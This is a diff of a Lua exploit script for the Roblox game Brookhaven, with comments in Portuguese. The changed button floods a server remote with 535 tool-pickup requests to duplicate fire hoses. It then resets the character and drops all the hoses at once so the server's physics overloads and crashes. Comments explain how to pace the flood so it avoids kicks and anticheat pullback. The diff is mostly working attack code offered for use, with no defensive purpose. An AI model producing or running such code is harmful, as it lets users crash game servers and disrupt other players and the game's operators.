@@ -554,40 +554,35 @@ MainTab:CreateButton({
    end,
 })
 
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local StarterGui = game:GetService("StarterGui")
+local LocalPlayer = Players.LocalPlayer
+
 MainTab:CreateButton({
-    Name = ";shutdownserver",
+    Name = "Executar Sistema de Dupe (Crash)",
     Callback = function()
-        local player = game:GetService("Players").LocalPlayer
-        if not player then return end
-
-        local replicatedStorage = game:GetService("ReplicatedStorage")
-        local character = player.Character or player.CharacterAdded:Wait()
+        local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
         local rootpart = character:WaitForChild("HumanoidRootPart", 10)
+        local remoteStorage = ReplicatedStorage:WaitForChild("RE", 10)
+        
+        if not rootpart or not remoteStorage then return end
+        
+        local toolRemote = remoteStorage:FindFirstChild("1Too1l")
+        if not toolRemote then return end
 
-        if not rootpart then 
-            -- Correção Rayfield: Adicionado o parâmetro 'Info' (ou use a variável global correta da sua flag se mudou)
-            Rayfield:Notify({Title = "Erro", Content = "HumanoidRootPart não encontrado.", Duration = 4, Image = 4483362458})
-            return 
-        end
+        -- Salva a posição original de onde você quer que o servidor caia
+        local oldcf = rootpart.CFrame
 
-        local re = replicatedStorage:FindFirstChild("RE")
-        local toolRemote = re and re:FindFirstChild("1Too1l")
-
-        if not toolRemote then 
-            Rayfield:Notify({Title = "Erro", Content = "Remote '1Too1l' não encontrado no Brookhaven.", Duration = 4, Image = 4483362458})
-            return 
-        end
-
-        Rayfield:Notify({
-            Title = "Duplicação Iniciada",
-            Content = "Iniciando geração de 354 cópias de FireHose...",
-            Duration = 5,
-            Image = 4483362458
+        StarterGui:SetCore("SendNotification", {
+            Title = "Script de Crash",
+            Text = "Injetando 535 requisições no servidor...",
+            Duration = 4
         })
 
+        -- 1. Loop Ultra Rápido de Spam de ferramentas
         task.spawn(function()
-            -- Loop otimizado para evitar estouro de memória/limite do buffer de rede
-            for m = 1, 354 do
+            for m = 1, 535 do
                 task.spawn(function()
                     if toolRemote:IsA("RemoteFunction") then
                         toolRemote:InvokeServer("PickingTools", "FireHose")
@@ -595,45 +590,28 @@ MainTab:CreateButton({
                         toolRemote:FireServer("PickingTools", "FireHose")
                     end
                 end)
-
-                -- Removido o segundo task.spawn idêntico que gerava requisições duplicadas erráticas
-                if m % 15 == 0 then 
-                    task.wait(0.05) -- Pausa leve para não desconectar por flood de rede
-                end
+                if m % 25 == 0 then task.wait(0.01) end -- Evita kick por drop de pacotes
             end
         end)
 
-        task.wait(0.4)
-
-        -- Monitora a redefinição do personagem de forma segura
-        player.CharacterRemoving:Wait()
-        local newCharacter = player.CharacterAdded:Wait()
-        local newRootPart = newCharacter:WaitForChild("HumanoidRootPart", 15)
-        local humanoid = newCharacter:WaitForChild("Humanoid", 15)
-
-        if newRootPart and humanoid then
-            task.wait(0.7)
-            -- Altera o estado para evitar que o anticheat puxe de volta imediatamente
-            humanoid:ChangeState(Enum.HumanoidStateType.Physics)
-            
-            -- Teleporte seguro para coordenadas distantes
-            newRootPart.CFrame = CFrame.new(999999, 99999, 99999) -- Ajustado para evitar posições NAN (Infinity) que quebram o motor físico do Roblox
-            newRootPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
-        end
-
-        Rayfield:Notify({
-            Title = "Processamento",
-            Content = "Teletransporte efetuado. Equipando e largando ferramentas...",
-            Duration = 4,
-            Image = 4483362458
-        })
         task.wait(0.5)
 
-        local backpack = player:WaitForChild("Backpack", 10)
+        -- 2. Teleporte para o Limbo e Reset para consolidar o inventário
+        rootpart.CFrame = CFrame.new(999999, 500, 999999)
+        
+        local humanoid = character:FindFirstChildOfClass("Humanoid")
+        if humanoid then humanoid.Health = 0 end
+
+        -- Aguarda o novo corpo carregar com as 535 ferramentas na Backpack
+        local newCharacter = LocalPlayer.CharacterAdded:Wait()
+        local newRootPart = newCharacter:WaitForChild("HumanoidRootPart", 15)
+        local backpack = LocalPlayer:WaitForChild("Backpack", 15)
+
+        task.wait(0.6) -- Tempo necessário para a replicação local dos itens
+
+        -- 3. Equipamento Simultâneo de todas as mangueiras
         if backpack then
             local items = backpack:GetChildren()
-            
-            -- Equipamento em lote
             for i = 1, #items do
                 local item = items[i]
                 if item:IsA("Tool") and item.Name == "FireHose" then
@@ -644,32 +622,33 @@ MainTab:CreateButton({
                     end)
                 end
             end
-            
-            task.wait(0.3)
+        end
 
-            -- Descarte no workspace de destino
+        task.wait(0.4) -- Tempo para o motor físico prender os itens ao personagem
+
+        -- 4. Retorno ao local e Descarte Total (Drop) para sobrecarregar a física
+        if newRootPart then
+            newRootPart.CFrame = oldcf
+            task.wait(0.1)
+            
             local charChildren = newCharacter:GetChildren()
             for j = 1, #charChildren do
                 local tool = charChildren[j]
                 if tool:IsA("Tool") and tool.Name == "FireHose" then
                     task.defer(function()
-                        tool.Parent = workspace
+                        tool.Parent = workspace -- Joga os 535 objetos físicos no chão de uma vez só
                     end)
                 end
             end
         end
-
-        task.wait(0.5)
-
-        Rayfield:Notify({
-            Title = "Concluído",
-            Content = "354 FireHoses dispersadas nas coordenadas remotas.",
-            Duration = 4,
-            Image = 4483362458
+        
+        StarterGui:SetCore("SendNotification", {
+            Title = "Script de Crash",
+            Text = "535 itens descartados. Aguardando sobrecarga físico-visual...",
+            Duration = 5
         })
     end,
 })
-
 -- ==========================================
 -- ABA 2: PAINEL ULTRA PRIVADO (Apenas se o ID for o do Dono)
 -- ==========================================
